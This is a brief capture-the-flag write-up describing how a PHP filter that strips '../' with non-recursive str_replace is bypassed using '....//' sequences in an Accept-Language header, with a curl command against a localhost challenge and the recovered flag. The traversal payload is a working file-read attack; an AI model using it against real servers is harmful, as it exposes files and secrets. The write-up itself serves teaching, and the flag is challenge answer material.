# 🔑 Write-Up

* we can see the php source code
* it uses `str_replace` to "escape" the header and prevent path traversal
* `str_replace` doesn't recursively replace the source string so it's easily bypassed

```
curl 'http://localhost:1235/' -H 'Accept-Language: ....//....//....//....//flag'
```

### 🚩 Flag

```
35c3_this_flag_is_the_be5t_fl4g
```